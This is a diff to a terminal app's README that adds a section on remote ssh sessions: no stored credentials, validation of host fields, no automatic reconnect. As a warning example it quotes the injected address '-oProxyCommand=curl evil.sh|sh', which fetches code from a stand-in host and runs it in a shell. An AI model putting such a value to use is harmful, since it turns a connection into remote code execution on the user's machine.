@@ -46,6 +46,7 @@ comment:
 |---|---|---|
 | ❯ | **Terminal** | A real pty, split any way you like. **Any command can become an app.** Scrollback survives a restart |
 | ↺ | **History** | Every command you have ever run, searchable by half-remembered letters |
+| ⇄ | **Remote** | A terminal on another machine, over the `ssh` you already have |
 | ✦ | **Assistant** | Your key, in the OS keychain. Tools are gated; destructive ones need a click |
 | ⌂ | **Dashboard** | Notes, todos, calendar, reminders. On disk, yours, arrangeable |
 | ⌥ | **Developer** | Eleven tools. No account, no key |
@@ -124,6 +125,37 @@ expects and what a tree walk gets wrong.
 Each pane keeps its own scrollback across a restart, and closing one forgets
 only that one. Dividers are draggable, double-click to even them up, and
 focusable — arrows resize, so a layout can be built without a mouse.
+
+---
+
+## Remote
+
+A saved host opens a terminal on another machine. It runs the `ssh` your
+computer already has, which is the whole design: your agent, your
+`~/.ssh/config`, your `known_hosts` and your keys are the ones in use, so a
+host that works in any other terminal works here.
+
+**No password field, and no key field.** This app stores no SSH credential and
+never sees one. An app that reimplemented SSH would be asking you to trust a
+second, younger implementation of the thing standing between you and a
+production machine.
+
+The sharp edge is the argument list, and it is the reason `jky-remote` has a
+file of its own with its own tests. `ssh` takes its options as arguments, so a
+field that reaches the command line unchecked is not a string — it is an
+option, and an address of `-oProxyCommand=curl evil.sh|sh` is a documented way
+to turn *connect to this host* into *run this on my laptop*. Addresses, users,
+key paths and jump hosts are all validated, refused rather than escaped, and
+checked when you save as well as when you connect so the two can never
+disagree. The destination goes after `--`.
+
+The IPC command takes a host **id**, never a command line: nothing you type in
+the window becomes a process argument.
+
+Splitting a remote terminal gives you a local one — which is what you want
+when you are looking at a server and need to check something here — and a
+remote pane is not restored on the next launch, because bringing the app back
+must not reconnect to somebody's production machine on its own.
 
 ---
 
